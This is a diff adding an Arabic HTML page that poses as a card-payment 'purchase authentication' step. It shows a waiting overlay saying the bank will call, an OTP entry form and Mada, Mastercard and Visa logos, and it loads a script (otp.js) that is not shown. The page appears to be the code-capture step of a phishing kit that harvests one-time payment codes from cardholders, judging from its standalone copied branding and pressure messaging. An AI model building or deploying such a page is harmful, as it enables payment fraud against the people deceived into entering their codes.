@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+                  <link rel="stylesheet" href="otp.css">
+
+  <title>مصادقة الشراء</title>
+  <style>
+
+  </style>
+</head>
+<body>
+
+<div class="overlay" id="overlay">
+  <img src="mobile.png" alt="loading" />
+  <h2>مصادقة الشراء</h2>
+  <p>يرجى الانتظار، العملية قيد التنفيذ...</p>
+  <p>لا تغادر أو تغلق الصفحة حتى انتهاء عملية الدفع.</p>
+  <p>سيتم الاتصال بك من قبل المصرف الخاص بحسابك.</p>
+  <p>بعدها سيتم إرسال رمز التحقق إلى رقم جوالك.</p>
+
+  <button class="wait-button" id="waitBtn" disabled>يرجى الانتظار...</button>
+</div>
+
+<div class="otp-section" id="otpSection">
+  <h3>الدفع بالبطاقات البنكية</h3>
+  <h2>إثبات ملكية البطاقة</h2>
+  <p id="otpText"></p>
+  <label for="otp"><strong>رمز التحقق *</strong></label>
+  <input type="text" id="otp" placeholder="يرجى ادخال رمز التحقق" maxlength="6" minlength="4" />
+  <p class="note">سيتم إرسال رسالة كود التحقق في خلال <span id="otpTimer">03:00</span> دقيقة</p>
+  <button>تأكيد</button>
+  <div class="brands">
+    <img src="Mada_Logo.svg.png" alt="mada">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="mastercard">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="visa">
+  </div>
+</div>
+<script src="otp.js">
+ 
+</script>
+
+
+</body>
+</html>
